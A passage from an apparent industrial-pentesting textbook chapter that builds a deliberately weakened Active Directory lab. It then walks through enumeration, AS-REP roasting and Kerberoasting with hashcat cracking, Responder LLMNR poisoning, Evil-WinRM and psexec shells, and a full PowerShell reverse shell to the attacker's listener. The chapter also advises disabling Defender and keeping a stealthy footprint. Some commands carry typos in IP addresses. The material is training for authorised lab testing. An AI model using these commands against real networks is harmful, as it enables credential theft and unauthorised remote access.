				<li>If everything <a id="_idIndexMarker708"/>has<a id="_idIndexMarker709"/> been configured<a id="_idIndexMarker710"/> correctly, you should get a Windows Security popup asking you to enter the name and password of an account with permission to join the domain. If you recall in the last section, we created a Domain Admin account. Go ahead and use those credentials to add this workstation to the domain:<div id="_idContainer419" class="IMG---Figure"><img src="image/Figure_10.44_B16321.jpg" alt="Figure 10.44 – Domain Admin login&#13;&#10;"/></div><p class="figure-caption">Figure 10.44 – Domain Admin login</p><p>If <a id="_idIndexMarker711"/>successful, you will be <a id="_idIndexMarker712"/>presented with the following message:</p><div id="_idContainer420" class="IMG---Figure"><img src="image/Figure_10.45_B16321.jpg" alt="Figure 10.45 – labcorp.local&#13;&#10;"/></div><p class="figure-caption">Figure 10.45 – labcorp.local</p><p>Once you click the <strong class="bold">OK</strong> button, you will be notified that for the changes to take effect you will need to reboot the workstation. Go ahead and reboot it. </p></li>
				<li>The final step will be to test whether the user that we created in the last section can log into this computer. Use the <strong class="source-inline">operator1</strong> account to log into the workstation computer:</li>
			</ol>
			<div>
				<div id="_idContainer421" class="IMG---Figure">
					<img src="image/Figure_10.46_B16321.jpg" alt="Figure 10.46 – operator1 login&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.46 – operator1 login</p>
			<p>A few extra<a id="_idIndexMarker713"/> configuration<a id="_idIndexMarker714"/> pieces need to be<a id="_idIndexMarker715"/> implemented in order to place the workstation into a vulnerable state:</p>
			<ul>
				<li>Turn the <strong class="bold">Windows Remote Management</strong> service on by simply starting it.</li>
				<li>Add <strong class="bold">Scada</strong> to <strong class="bold">Local</strong> <strong class="bold">Group</strong> | <strong class="bold">Remote Management Users.</strong></li>
				<li>Make sure firewall rules are enabled for port <strong class="source-inline">3389</strong>.</li>
			</ul>
			<p>Under <strong class="bold">Services</strong>, open up <strong class="bold">Windows Remote Management (WS-Management) Properties</strong>. Under <strong class="bold">General</strong>, we are going to set <strong class="bold">Startup type</strong> as <strong class="bold">Automatic</strong>, then click <strong class="bold">Start</strong> to get <strong class="bold">Service status</strong> as <strong class="bold">Running</strong>, as follows:</p>
			<div>
				<div id="_idContainer422" class="IMG---Figure">
					<img src="image/Figure_10.47_B16321.jpg" alt="Figure 10.47 – Service status&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.47 – Service status</p>
			<p>Here we <a id="_idIndexMarker716"/>want<a id="_idIndexMarker717"/> to add the <strong class="bold">LABCORP\Scada</strong> group<a id="_idIndexMarker718"/> to the <strong class="bold">Remote Management Users</strong> group on the Windows 10 workstation:</p>
			<div>
				<div id="_idContainer423" class="IMG---Figure">
					<img src="image/Figure_10.48_B16321.jpg" alt="Figure 10.48 – Remote management group&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.48 – Remote management group</p>
			<p>Under <strong class="bold">Windows Defender Firewall with Advanced Security</strong>, enable <strong class="bold">Windows Remote Management</strong>:</p>
			<div>
				<div id="_idContainer424" class="IMG---Figure">
					<img src="image/Figure_10.49_B16321.jpg" alt="Figure 10.49 – Windows Defender&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.49 – Windows Defender</p>
			<p>This wraps <a id="_idIndexMarker719"/>up<a id="_idIndexMarker720"/> the installation and configuration of the<a id="_idIndexMarker721"/> workstation. We are now going to move on to the Kali VM, and ensure we have the tools installed to move forward.</p>
			<h2 id="_idParaDest-111"><a id="_idTextAnchor125"/>Kali Linux tools</h2>
			<p>Now that we <a id="_idIndexMarker722"/>have the corporate<a id="_idIndexMarker723"/> side of the network installed and configured, we will open up the Kali Linux attack box. From here, we need to install a few different tools that were mentioned in the <em class="italic">Technical requirements</em> section. These tools are extremely useful when dealing with Windows-based environments. I would say 100% of the companies that I have been involved with were all running some form and configuration of AD inside their corporate environment. The tools to install are listed as follows: </p>
			<ul>
				<li><strong class="bold">Impacket</strong>: The <a id="_idIndexMarker724"/>first tool that we are going to install on our Kali<a id="_idIndexMarker725"/> Linux VM will be Impacket. This is ultimately a library of Python classes that interact with Windows-based protocols at the packet level. This tool performs all the heavy lifting of building, connecting, maintaining, and tearing down a session. To get started, we<a id="_idIndexMarker726"/> want to use the following link: <a href="https://github.com/SecureAuthCorp/impacket/releases">https://github.com/SecureAuthCorp/impacket/releases</a>.<p>From here, download the latest package. When this is done, decompress the <strong class="source-inline">.tar</strong> file and simply run the following command inside the <strong class="source-inline">impacket</strong> folder:</p><p class="source-code"><strong class="bold">python3 -m pip install .</strong></p></li>
				<li><strong class="bold">Kerbrute</strong>: Next, we want to<a id="_idIndexMarker727"/> install Kerbrute. This is a tool that automates the enumeration of AD accounts. Use the following link: <a href="https://github.com/ropnop/kerbrute/releases/tag/v1.0.3">https://github.com/ropnop/kerbrute/releases/tag/v1.0.3</a>. <p>Make sure that you change the executability of the file.</p></li>
				<li><strong class="bold">Evil-WinRM</strong>: Finally, we<a id="_idIndexMarker728"/> want to install <strong class="source-inline">Evil-WinRM</strong>. This <a id="_idIndexMarker729"/>is a tool for pentesting <strong class="bold">Windows Remote Management</strong> (<strong class="bold">WinRM</strong>). Run the following command:<p class="source-code"><strong class="bold">sudo gem install evil-winrm</strong></p></li>
			</ul>
			<p>In this section, we spent time building out a domain controller and workstation. We added AD, DNS, DHCP, and file share features to the domain controller. We created a domain and then added users to this domain, then joined the workstation to it. Finally, we made sure that our Kali Linux VM had the tools needed to "PWN" the corporate environment. In the next section, we will be using those tools we installed to move forward and <a id="_idIndexMarker730"/>launch attacks on the corporate side of the network. </p>
			<h1 id="_idParaDest-112"><a id="_idTextAnchor126"/>Discovering and launching our attacks</h1>
			<p>We have<a id="_idIndexMarker731"/> the<a id="_idIndexMarker732"/> corporate lab established and configured, and we have installed new tools into our Kali distribution. The next item on the agenda is to start taking a look at the network that we have been dropped into. In <a href="B16321_07_Epub_AM.xhtml#_idTextAnchor081"><em class="italic">Chapter 7</em></a>, <em class="italic">Scanning 101</em>, we covered a number of different tools. We can use them here to perform discovery attacks. However, I feel that it would be more appropriate to look at other methods to grow our pentesting arsenal.   </p>
			<p>Let's start by skipping over <strong class="source-inline">rustscan</strong> and <strong class="source-inline">nmap</strong> and jump right into enumerating host machines by their NetBIOS names. Run the <strong class="source-inline">nbtscan</strong> command on your current subnet by using the following command:</p>
			<p class="source-code">nbtscan 172.16.0.0/24</p>
			<p>We should now see our two machines, <strong class="source-inline">DC01</strong> and <strong class="source-inline">WS01</strong>, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer425" class="IMG---Figure">
					<img src="image/Figure_10.50_B16321.jpg" alt="Figure 10.50 – nbtscan&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.50 – nbtscan</p>
			<p>Quickly identifying NetBIOS names allows us to take an educated guess that <strong class="source-inline">DC01</strong> is the domain controller. With this information in mind, we now want to run <strong class="source-inline">enum4linux</strong> against the discovered machine names, to see whether we can extract more detail. Run the following command:</p>
			<p class="source-code">enum4linux 172.16.0.2</p>
			<p>You should see the following results:</p>
			<div>
				<div id="_idContainer426" class="IMG---Figure">
					<img src="image/Figure_10.51_B16321.jpg" alt="Figure 10.51 – enum4linux&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.51 – enum4linux</p>
			<p>We have <a id="_idIndexMarker733"/>now<a id="_idIndexMarker734"/> discovered the <strong class="source-inline">LABCORP</strong> domain name. From here, we want to try and enumerate users that may exist on the domain. Using Kerbrute (we installed this in the last section) will allow us to enumerate users by sending Kerberos requests to the domain controller. We do this by using a generated list of traditional ICS users that contains usernames such as these:</p>
			<ul>
				<li><strong class="source-inline">admin</strong></li>
				<li><strong class="source-inline">root</strong></li>
				<li><strong class="source-inline">operator1</strong></li>
				<li><strong class="source-inline">operator2</strong></li>
				<li><strong class="source-inline">operator3</strong></li>
				<li><strong class="source-inline">scada</strong></li>
				<li><strong class="source-inline">scada-user</strong></li>
				<li><strong class="source-inline">scada1</strong></li>
				<li><strong class="source-inline">scada2</strong></li>
			</ul>
			<p>We can now run the following command:</p>
			<p class="source-code">./kerbrute_linux_amd64 userenum Industrial_Pentesting/users.txt -d labcorp.local -dc 172.16.0.2</p>
			<p>You can see from the following output that we successfully enumerated four valid users:</p>
			<div>
				<div id="_idContainer427" class="IMG---Figure">
					<img src="image/Figure_10.52_B16321.jpg" alt="Figure 10.52 – Enumerated users&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.52 – Enumerated users</p>
			<p>Next, we <a id="_idIndexMarker735"/>are<a id="_idIndexMarker736"/> going to use some sub-features of the Impacket tool that we installed in the last section. Specifically, we are going to run the <strong class="source-inline">impacket-GetNPUsers</strong> command to see whether any of the AD users have Kerberos preauthentication disabled. Run the following command:</p>
			<p class="source-code">impacket-GetNPUsers labcorp.local/Adminstrator -dc-ip 127.16.0.2 -no-pass</p>
			<p>And as expected, the <strong class="source-inline">Administrator</strong> account has <strong class="source-inline">preauth</strong> enabled, as shown here:</p>
			<div>
				<div id="_idContainer428" class="IMG---Figure">
					<img src="image/Figure_10.53_B16321.jpg" alt="Figure 10.53 – Impacket administrator check&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.53 – Impacket administrator check</p>
			<p>Now test another account. If you recall the AD user setup where we adjusted operator2's config by disabling <strong class="source-inline">preauth</strong>, we should get a valid response by using the following command:</p>
			<p class="source-code">impacket-GetNPUsers labcorp.local/operator2 -dc-ip 127.16.0.2 -no-pass</p>
			<p>You can <a id="_idIndexMarker737"/>see <a id="_idIndexMarker738"/>that we have discovered a hash for <strong class="source-inline">operator2</strong>:</p>
			<div>
				<div id="_idContainer429" class="IMG---Figure">
					<img src="image/Figure_10.54_B16321.jpg" alt="Figure 10.54 – operator2 hash&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.54 – operator2 hash</p>
			<p>Discovering this hash, we can use <strong class="source-inline">hashcat</strong>. Use mode, <strong class="source-inline">-m 18200</strong> for Kerberos to crack this hash by running the following command:</p>
			<p class="source-code">sudo hashcat -m 18200 operator2.hash /usr/share/wordlists/rockyou.txt</p>
			<p>Depending on the complexity of your password, this could take a fair amount of time. However, if you kept the current settings from earlier in the chapter, it will only take a few seconds to crack the <strong class="source-inline">operator2</strong> password. Here, you can see that at the end of the Kerberos hash, the password, <strong class="source-inline">Password2</strong>, has been appended, indicating that we have successfully cracked the hash:</p>
			<div>
				<div id="_idContainer430" class="IMG---Figure">
					<img src="image/Figure_10.55_B16321.jpg" alt="Figure 10.55 – operator2's password&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.55 – operator2's password</p>
			<p>We could simply use these newly discovered credentials to remote to the machine, or leverage them to do more discovery through Impacket. Since the title of this section is <em class="italic">Discovering and launching our attacks</em>, we are going to leverage this account to perform further discovery. We are going to run the following command:</p>
			<p class="source-code">impacket-GetADUsers -all labcorp.local/operator2 -dc-ip 172.16.0.2</p>
			<p>This will use <strong class="source-inline">operator2</strong> to enumerate all the AD users:</p>
			<div>
				<div id="_idContainer431" class="IMG---Figure">
					<img src="image/Figure_10.56_B16321.jpg" alt="Figure 10.56 – GetADUsers&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.56 – GetADUsers</p>
			<p>Continuing<a id="_idIndexMarker739"/> down<a id="_idIndexMarker740"/> the discovery path, we are going to use another Impacket tool to extract service accounts using the default behavior of Kerberos. We are going to run the following command:</p>
			<p class="source-code">impacket-GetUserSPNs labcorp.local/operator2:Password2 -dc-ip 172.16.0.2 -request</p>
			<p>This is a very scary attack, as it does not require an elevated user to extract service accounts inside the domain controller. After running the command, you should see that we have discovered the SPN of <strong class="source-inline">operator3</strong>. This is from the Kerberos configuration portion of the last section:</p>
			<div>
				<div id="_idContainer432" class="IMG---Figure">
					<img src="image/Figure_10.57_B16321.jpg" alt="Figure 10.57 – SPN&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.57 – SPN</p>
			<p>Once again, we have discovered a hash and, from looking at it, it appears to be Kerberos but in a different format. Doing some simple research, we discover that it is saved in TGS format. Now, we want to crack the hash using <strong class="source-inline">hashcat</strong>, by running the following command:</p>
			<p class="source-code">hashcat -m 13100 operator3.hash /usr/share/wordlists/rockyou.txt </p>
			<p>This will <a id="_idIndexMarker741"/>then <a id="_idIndexMarker742"/>successfully crack the hash and present you with the following output:</p>
			<div>
				<div id="_idContainer433" class="IMG---Figure">
					<img src="image/Figure_10.58_B16321.jpg" alt="Figure 10.58 – operator3 cracked password&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.58 – operator3 cracked password</p>
			<p>Next, we are going to run <strong class="source-inline">responder</strong>. This gets installed with Impacket. Now, <strong class="source-inline">responder</strong> gives us the ability to poison <strong class="bold">Link-Local Multicast Name Resolution</strong> (<strong class="bold">LLMNR</strong>), and <a id="_idIndexMarker743"/>spoof an SMB request in order to capture<a id="_idIndexMarker744"/> Windows <strong class="bold">New Technology LAN Manager</strong> (<strong class="bold">NTLM</strong>) hashes on the network.</p>
			<p>We are going to run <strong class="source-inline">responder</strong> with the following command:</p>
			<p class="source-code">sudo responder -I eth1 </p>
			<p>You should get the following results showing that the poisoners are running and that the servers are live:</p>
			<div>
				<div id="_idContainer434" class="IMG---Figure">
					<img src="image/Figure_10.59_B16321.jpg" alt="Figure 10.59 – responder running&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.59 – responder running</p>
			<p>Now, to trigger<a id="_idIndexMarker745"/> the <a id="_idIndexMarker746"/>capture, as we have a very static lab environment, log into your Windows 10 VM and open your browser. Type in a string and press <em class="italic">Enter</em>:</p>
			<div>
				<div id="_idContainer435" class="IMG---Figure">
					<img src="image/Figure_10.60_B16321.jpg" alt="Figure 10.60 – Test&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.60 – Test</p>
			<p>If everything is set up correctly, you should see that <strong class="source-inline">responder</strong> has captured the NTLM hash for <strong class="source-inline">operator1</strong>, as shown here:</p>
			<div>
				<div id="_idContainer436" class="IMG---Figure">
					<img src="image/Figure_10.61_B16321.jpg" alt="Figure 10.61 – NTLM hash&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.61 – NTLM hash</p>
			<p>As we have done previously, we will use <strong class="source-inline">hashcat</strong> to crack the password for <strong class="source-inline">operator1</strong>. Run the following command:</p>
			<p class="source-code">hashcat -m 5600 operator1.hash /usr/share/wordlists/rockyou.txt</p>
			<p>The<a id="_idIndexMarker747"/> password <a id="_idIndexMarker748"/>should crack relatively fast and you will see the following result:</p>
			<div>
				<div id="_idContainer437" class="IMG---Figure">
					<img src="image/Figure_10.62_B16321.jpg" alt="Figure 10.62 – operator1 password&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.62 – operator1 password</p>
			<p>In this section, you can see how easy it is, with the right tools, to start to enumerate a domain controller to gain useful insight into the corporate environment. We were able to enumerate credentials and discover domain accounts with a general user account.  We were able to capture hashes by poisoning LLMNR, NBT-NS, and DNS/MDNS.  Throughout the section, we used <strong class="source-inline">hashcat</strong> to perform various modes of cracking on the hashes that we discovered. We have barely touched on a fraction of the power that these tools contain. I strongly encourage you to read up on the documentation for enum4linux, Impacket, Kerbrute, and hashcat.  </p>
			<p>In the next section, we are going to leverage the <strong class="source-inline">username:password</strong> combinations that we discovered and cracked, to gain a foothold into the various systems in the corporate network.</p>
			<h1 id="_idParaDest-113"><a id="_idTextAnchor127"/>Getting shells</h1>
			<p>Now that we <a id="_idIndexMarker749"/>have three sets of credentials and a list of five additional usernames, it is time to leverage the credentials and land a foothold/shell into the corporate computers. We are going to leverage Evil-WinRM, Impacket-psexec, and PowerShell to perform various exploits to gain access to the Windows hosts. </p>
			<p>We are going to start with <strong class="source-inline">Evil-WinRM</strong>, and we will be using the following credentials to see whether we can get a shell: <strong class="source-inline">operator2:Password2</strong>. Run the following command:</p>
			<p class="source-code">evil-winrm -I 172.16.0.4 -u operator2 -p Password2</p>
			<p>If everything has been configured correctly from the first section of this chapter, you will get the following result:</p>
			<div>
				<div id="_idContainer438" class="IMG---Figure">
					<img src="image/Figure_10.63_B16321.jpg" alt="Figure 10.63 – Evil-WinRM shell&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.63 – Evil-WinRM shell</p>
			<p><em class="italic">Voilà</em>! We have our first shell, and now it is time to explore the capabilities of our new shell. Type in the <strong class="source-inline">menu</strong> command and press <em class="italic">Enter</em>. This will then bring up a list of post-exploit modules:</p>
			<div>
				<div id="_idContainer439" class="IMG---Figure">
					<img src="image/Figure_10.64_B16321.jpg" alt="Figure 10.64 – Evil-WinRM shell menu&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.64 – Evil-WinRM shell menu</p>
			<p class="callout-heading">Story Time</p>
			<p class="callout">I remember having a conversation with Rob Mubix Fuller. He imparted a nugget of wisdom to me that had previously been passed on to him: <em class="italic">two is one and one is none</em>, meaning that if you have a shell and only one shell, you don't really have any shells. You need a backup plan in case your primary session gets lost or severed. This has always stuck with me, and I will pass this insight on to you. So remember, if you land a shell, make sure to build a second one as fast as possible.</p>
			<p>With that said, we<a id="_idIndexMarker750"/> need to build out another shell. A great resource is <strong class="bold">Payloads All The Things</strong>. This <a id="_idIndexMarker751"/>can be accessed via the following link: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a>.  </p>
			<p>We will be using the Reverse Shell Cheat Sheet to find a PowerShell method. The following code shows the PowerShell command that we will be using to connect back to our Kali Linux VM:</p>
			<p class="source-code">client = New-Object System.Net.Sockets.TCPClient("172.16.0.6",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</p>
			<p>To make this work in our current environment, we must disable <strong class="bold">Real-time protection</strong> on the Windows 10 VM:</p>
			<div>
				<div id="_idContainer440" class="IMG---Figure">
					<img src="image/Figure_10.65_B16321.jpg" alt="Figure 10.65 – Virus and threat protection settings&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.65 – Virus and threat protection settings</p>
			<p>After<a id="_idIndexMarker752"/> disabling <strong class="bold">Real-time protection</strong>, we are going to set up a new listener using the following command:</p>
			<p class="source-code">nc -nvlp 4242</p>
			<p>After executing the command, we will see the following output:</p>
			<div>
				<div id="_idContainer441" class="IMG---Figure">
					<img src="image/Figure_10.66_B16321.jpg" alt="Figure 10.66 – Listener port 4242&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.66 – Listener port 4242</p>
			<p>Next, we want to execute the PowerShell command from the previous figure. Once the reverse shell connects, we will see the following output:</p>
			<div>
				<div id="_idContainer442" class="IMG---Figure">
					<img src="image/Figure_10.67_B16321.jpg" alt="Figure 10.67 – Reverse PowerShell&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.67 – Reverse PowerShell</p>
			<p>Now we have successfully landed a reverse shell using the PowerShell payload. Next, we are going to run an exploit with Impacket-psexec to gain a new shell. We will be using the Domain Admin account that we created in the first section of this chapter. Start by running the following command:</p>
			<p class="source-code">impacket-psexec labcorp.local/lab.da:'Password123'@<a id="_idTextAnchor128"/>172.16.02</p>
			<p>After running the <a id="_idIndexMarker753"/>preceding command, you will see the following outcome:</p>
			<div>
				<div id="_idContainer443" class="IMG---Figure">
					<img src="image/Figure_10.68_B16321.jpg" alt="Figure 10.68 – impacket-psexec&#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 10.68 – impacket-psexec</p>
			<p>After getting this far, you might be asking yourself – since we already have credentials, couldn't we<a id="_idIndexMarker754"/> just <strong class="bold">Remote Desktop Protocol</strong> (<strong class="bold">RDP</strong>) to the Windows host and try to exploit from there? You would be absolutely correct. You could use the credentials and RDP to the Windows host. However, you would have to be careful. However much we cover our tracks, there will always be a trail to follow. If you start to use RDP sessions, they can become very loud and you will most likely start to bump into the owners of the credentials that you have cracked because they could be logged into the machine.  </p>
			<h1 id="_idParaDest-114"><a id="_idTextAnchor129"/>Summary</h1>
			<p>This chapter has covered a lot of material. We built out a domain controller with AD, set up a DNS server and a DHCP server, created a file share, and used multiple tools to enumerate, poison traffic, and gain shells. Every one of these topics and tools is deserving of its own book. To be honest, writing about the corporate side after spending a career in the operational technology field does feel a bit like "imposter syndrome." I can certainly reaffirm the importance of practicing gaining access to individual hosts on the corporate network, as no two pentest engagements are alike. You cannot expect to succeed if you don't try harder and round out your skillset. In the next chapter, we will be diving deeper into the network by pivoting through our current lab setup to examine the process level and ultimately end up controlling the physical I/O.</p>
		</div>
	</body></html>